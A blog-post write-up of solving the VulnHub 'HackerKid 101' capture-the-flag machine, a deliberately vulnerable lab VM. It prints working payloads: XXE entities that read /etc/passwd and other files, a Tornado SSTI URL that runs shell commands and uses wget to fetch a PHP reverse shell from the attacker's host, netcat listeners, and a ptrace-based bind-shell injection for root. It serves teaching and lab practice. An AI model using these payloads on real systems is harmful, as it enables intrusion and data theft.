---
published: true
layout: post
author: mark
date: '2021-09-21 00:00:01 UTC'
tags: ctf vulnhub hackerkid
---
Hello all. We have another day and another vuln machine to crack.
Today we are looking at [HackerKid 101](https://www.vulnhub.com/entry/hacker-kid-101,719/) (Medium difficulty) from an Author we have checked out before Saket Sourav. :)

Also make sure to check out the [VOD](https://www.youtube.com/channel/UCBE5zF0VuDwn2-cAMNBJvkA) on youtube if you missed the livestream. :)

## Prep:
- Get your VMs a running (Kali and _the target_)
- Ensure you have burp suite running.
- Ensure you have gobuster and seclists (if you prefer seclists) installed on your Kali machine.
- Something to drink
- Haxxor music

Just a handy hint. Export your targetip like below and then when you copy the commands no editing your ip into it required.

```
export TARGETIP=192.168.1.22
```

## Write up:

[insert witty hackerkid intro line. :P ]
Lets kick it off with the same thing we always start with. A good old nmap scan.

```
nmap -sC -sV $TARGETIP -oN nmap.log
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 12:29 AEST
Nmap scan report for ubuntu.localdomain (192.168.1.165)
Host is up (0.00012s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Notorious Kid : A Hacker
9999/tcp open  http    Tornado httpd 6.1
|_http-server-header: TornadoServer/6.1
| http-title: Please Log In
|_Requested resource was /login?next=%2F
MAC Address: 00:0C:29:27:60:10 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
```

Interestingly we have a website on port 9999 with a Please Log In banner.

Starting with the site on port 80 though we see there are a lot of hints to the DNS tool DIG The fact that we also have DNS running on the target gives us a good indicator that we should go take a poke at port 53:

![image1.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE1.png)

Before we go look at DNS, we shall run our usual gobuster enumeration to gather intel.

```
gobuster dir -u $TARGETIP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x xml,txt,php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.21/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              xml,txt,php,html
[+] Timeout:                 10s
===============================================================
2021/08/25 22:52:00 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://192.168.1.21/images/]
/index.php            (Status: 200) [Size: 3597]                                 
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.21/css/]   
/form.html            (Status: 200) [Size: 10219]                                
Progress: 4550 / 1102805 (0.41%)                                              
/app.html             (Status: 200) [Size: 8048]                                 
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.21/javascript/]
Progress: 10935 / 1102805 (0.99%)                                             
Progress: 16990 / 1102805 (1.54%)                                             
Progress: 23105 / 1102805 (2.10%)                                             
Progress: 29445 / 1102805 (2.67%)                                             
Progress: 35765 / 1102805 (3.24%)                                             
Progress: 42035 / 1102805 (3.81%)                                             
Progress: 46270 / 1102805 (4.20%)                                             
Progress: 51870 / 1102805 (4.70%)                                             
Progress: 57780 / 1102805 (5.24%)                                             
Progress: 63965 / 1102805 (5.80%)                                             
Progress: 70230 / 1102805 (6.37%)                                             
Progress: 75940 / 1102805 (6.89%)                                             
Progress: 81835 / 1102805 (7.42%)                                             
Progress: 88005 / 1102805 (7.98%)                                             
Progress: 94140 / 1102805 (8.54%)                                              
/server-status        (Status: 403) [Size: 277]                                      

===============================================================                                       
2021/08/25 22:53:42 Finished                                                                                
===============================================================  
```

Nothing that looks too out of place or worthy of chasing just yet.

Back on the webpage lets take a look at the source code.

![image2.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE2.png)

It mentions using a GET parameter to navigate through the pages.
Lets create a massive list of potential page numbers and run it through wfuzz:

```
for i in {1..5000}; do echo $i >> list.txt; done
```

```
wfuzz --hh 3654 -w list.txt http://$TARGETIP/\?page_no\=FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.165/?page_no=FUZZ
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                   
=====================================================================

000000021:   200        116 L    310 W      3849 Ch     "21"                                                      

Total time: 5.486632
Processed Requests: 5000
Filtered Requests: 4999
Requests/sec.: 911.3057
```
We use the `--hh 3654` argument to hide any responses with a length of 3654 characters, and we get back a hit on page_no=21. Lets browse to it and check it out.
It looks like there is some extra text at the bottom of the page.

![image3.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE3.png)

Another hint to look at [DIG](https://linux.die.net/man/1/dig) so let’s go ahead and do that.


```
dig @$TARGETIP

; <<>> DiG 9.16.15-Debian <<>> @192.168.1.165
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 12329
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 1bf4a994c43c80da010000006126ffda7fb551540682fa74 (good)
;; QUESTION SECTION:
;.                              IN      NS

;; Query time: 2540 msec
;; SERVER: 192.168.1.165#53(192.168.1.165)
;; WHEN: Thu Aug 26 12:43:40 AEST 2021
;; MSG SIZE  rcvd: 56
```
Running a standard DIG command against our target IP address returns a cookie value which is unexpected.
Lets try a dig using the domain info from our page21 site.

```
dig hackers.blackhat.local @$TARGETIP    

; <<>> DiG 9.16.15-Debian <<>> hackers.blackhat.local @192.168.1.165
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 15680
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 69dbeace628847ef01000000612703e15a93d885575fe242 (good)
;; QUESTION SECTION:
;hackers.blackhat.local.                IN      A

;; AUTHORITY SECTION:
blackhat.local.         3600    IN      SOA     blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600

;; Query time: 4 msec
;; SERVER: 192.168.1.165#53(192.168.1.165)
;; WHEN: Thu Aug 26 13:00:51 AEST 2021
;; MSG SIZE  rcvd: 125
```

Ok cool. We attempt some DNS zone transfers with the information from the previous result and are able to successfully perform one on the top level domain.

```
dig blackhat.local @$TARGETIP axfr

; <<>> DiG 9.16.15-Debian <<>> blackhat.local @192.168.1.165 axfr
;; global options: +cmd
blackhat.local.         10800   IN      SOA     blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
blackhat.local.         10800   IN      NS      ns1.blackhat.local.
blackhat.local.         10800   IN      MX      10 mail.blackhat.local.
blackhat.local.         10800   IN      A       192.168.14.143
ftp.blackhat.local.     10800   IN      CNAME   blackhat.local.
hacker.blackhat.local.  10800   IN      CNAME   hacker.blackhat.local.blackhat.local.
mail.blackhat.local.    10800   IN      A       192.168.14.143
ns1.blackhat.local.     10800   IN      A       192.168.14.143
ns2.blackhat.local.     10800   IN      A       192.168.14.143
www.blackhat.local.     10800   IN      CNAME   blackhat.local.
blackhat.local.         10800   IN      SOA     blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
;; Query time: 0 msec
;; SERVER: 192.168.1.165#53(192.168.1.165)
;; WHEN: Mon Sep 20 11:36:41 AEST 2021
;; XFR size: 11 records (messages 1, bytes 353)
```

We get a bunch of domains here. Some web servers are set up to route to different sites based on the HOST in the request. So lets go an add these to our /etc/hosts file and hit the site again:

```
192.168.1.xx hackerkid.blackhat.local mail.blackhat.local ftp.blackhat.local hacker.blackhat.local mail.blackhat.local www.blackhat.local
```

Looks like hackers.blackhat.local brings up the website we view at the moment, but hackerkid.blackhat.local brings up a new website.

![image4.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE4.png)

When we try to create a new account, our request fails, but looking at the proxy, the POST body is all XML.. perhaps we can try some XXE.

In the websites code, we see how the POST request is being made.

![image5.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE5.png)

For our XXE to work, we want it to replace a field that we will have visibility of in the response. Lucky for us this application displays the email field back to us. How convenient!

Read more about XXE [here](https://www.hackingarticles.in/comprehensive-guide-on-xxe-injection/)

Lets try this is a super basic XXE attack payload - taken from github [RihaMaheshwari/XXE-Injection-Payloads](https://github.com/RihaMaheshwari/XXE-Injection-Payloads)

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

XML External Entities allow us to grab external files or objects and include them in our XML file. We can prove the concept with the sample above, but replacing the main body of the XML with the one from our target application.

Send a POST request to repeater, and test it out as normal.

![image6.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE6.png)

Next we attempt our XXE POC:

![image7.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE7.png)

Success! Now to do something juicy with it, lets try to include the /etc/passwd file.

Instead of replace we are going to use the SYSTEM attribute to include a file from the local filesystem.

```
<!ENTITY example SYSTEM "file:///etc/passwd">
```

![image8.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE8.png)

Another success!

Our passwd file.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
bind:x:126:133::/var/cache/bind:/usr/sbin/nologin
```
Looks like there is only one user - saket.
Because we are working with data over the web, URL encoding and encoding in general can play havok with our attempts to include files. So looking further down the XXE reference page there are some handy PHP wrappers that will base64 encode file contents for us.

```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
even potentially run PHP code.
```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]
```

So we went fuck it and took a linux LFI cheatsheet list from [github](https://github.com/hussein98d/LFI-files/blob/master/list.txt), did some magic to it, `replaced [USERNAME] with saket, replaced the /root ones with /home/saket/ because ~ wont work`, and dumped it into a sniper intruder and just let it run. Eventually we got back some results.

We have the .bashrc file in sakets home directory.

![image9.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE9.png)

Which has some a password for us (to tie to the user we are looking at)

```
username: saket
password: Saket!#$%@!!
```

And another interesting result was `/opt/server.py` We found this by guessing that the user would have installed optional apps to `/opt/` and then the information on how tornado server is setup. And tbh a bit of luck which is always nice :)

![image10.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE10.png)

Lets try them on that site that requires auth on port 9999
```
http://hackerkid.blackhat.local:9999
```

The logon had a query string parameter ?next which doesn’t appear to do much, but after logging in the application asks us for a name.

![image11.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE11.png)

So lets pass it a name as a query parameter. And it just responds back with whatever we put in.

```
http://hackerkid.blackhat.local:9999/?name=thoseguys
```

![image12.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE12.png)

Lets see what we can do with this one.

We notice that it is vulnerable to SSTI using this.
{% raw %}
```
http://hackerkid.blackhat.local:9999?name={%import%20os%}{{os.popen(%22whoami%22).read()}}
```
{% endraw %}
![image13.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE13.png)

This gives us back saket which is the user we noted in the passwd file.

On our local machine we can use python to server up our trusty php reverse shell. Copy a simple rev.php shell to the local directory and then run a server.

```
python3 -m http.server 8000
```

Then use our SSTI to run wget and download it.
{% raw %}
```
http://hackerkid.blackhat.local:9999/?name={%import%20os%}{{os.popen(%22wget%20http://192.168.1.162:8000/rev.php%20-O%20/tmp/rev.php%22).read()}}
```
{% endraw %}
Lets set up our listener with netcat.

```
nc -nlvp 443
```

and now simply run that rev.php file directly using the php cli.
{% raw %}
```
http://hackerkid.blackhat.local:9999/?name={%import%20os%}{{os.system(%22php%20/tmp/rev.php%22)}}
```
{% endraw %}
![image14.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE14.png)

And that looks like a shell.

We do the standard enumeration and there is no sudo, no sitcky bits, no weird / custom binaries in bin folders, no crons, nothing listening on local only ports. However `getcap` returns something interesting.

```
saket@ubuntu:/$ echo $PATH
echo $PATH
/usr/bin:/bin
saket@ubuntu:/$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

So lets priv esc by abusing sys ptrace. [Link](https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc)

Lets check for any processes running as root.

```
ps -eaf
```

We randomly seem to have an apache2 instance running as root (process id 945)

```
root         945       1  0 07:37 ?        00:00:01 /usr/sbin/apache2 -k start
```

According to the article we need to spin up a BIND shell. so lets go look one up..
[gist BIND shell](https://gist.githubusercontent.com/wifisecguy/1d69839fe855c36a1dbecca66948ad56/raw/e919439010bbabed769d86303ff18ffbacdaecfd/inject.py)

We use wget again to transfer it to the box and run it with python2

```
saket@ubuntu:/tmp$ which python
which python
saket@ubuntu:/tmp$ python3 exploit.py 945
python3 exploit.py 945
Instruction Pointer: 0x0
Injecting Shellcode at: 0x0
Traceback (most recent call last):
  File "exploit.py", line 74, in <module>
    for i in xrange(0,len(shellcode),4):
NameError: name 'xrange' is not defined
saket@ubuntu:/tmp$ python2 exploit.py 945
python2 exploit.py 945
Instruction Pointer: 0x7fe67d2040daL
Injecting Shellcode at: 0x7fe67d2040daL
Shellcode Injected!!
Final Instruction Pointer: 0x7fe67d2040dcL
```

Check locally to see if there is now something listening on port 5600

```
saket@ubuntu:/tmp$ netstat -anlp
netstat -anlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5600            0.0.0.0:*               LISTEN      -                   
tcp        1      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      808/python3         
tcp        0      0 192.168.1.165:53        0.0.0.0:*               LISTEN      -   
...          
```

BOOOM

Now lets connect and see what happens

```
c -nv 192.168.1.165 5600
(UNKNOWN) [192.168.1.165] 5600 (?) open
whoami
root
python2 -c 'import pty; pty.spawn("/bin/bash")'
root@ubuntu:/# cd /root
cd /root
root@ubuntu:/root# ls -la
ls -la
total 2744
drwx------  8 root root    4096 Jun 28 22:18 .
drwxr-xr-x 20 root root    4096 May 29 05:34 ..
-rw-------  1 root root     680 Jun 28 22:19 .bash_history
-rw-r--r--  1 root root    3106 Dec  5  2019 .bashrc
drwx------  8 root root    4096 Jun 28 21:31 .cache
drwx------ 11 root root    4096 Jun 28 20:34 .config
drwx------  3 root root    4096 Jun  2 20:58 .dbus
drwxr-xr-x  3 root root    4096 Jun 26 07:24 .gem
drwxr-xr-x  3 root root    4096 May 29 05:52 .local
-rw-r--r--  1 root root     161 Dec  5  2019 .profile
-rw-r--r--  1 root root      66 Jun 26 22:56 .selected_editor
-rw-r--r--  1 root root     328 Jun 27 05:20 .wget-hsts
-rwxrw-rw-  1 root root 2749141 Jun 28 21:29 App.zip
-rwxr-xr-x  1 root root    3654 Jun 27 08:38 server.py
drwxr-xr-x  2 root root    4096 Jun 27 07:54 templates
root@ubuntu:/root#
```

And there we have it. A nice and happy root shell. :)
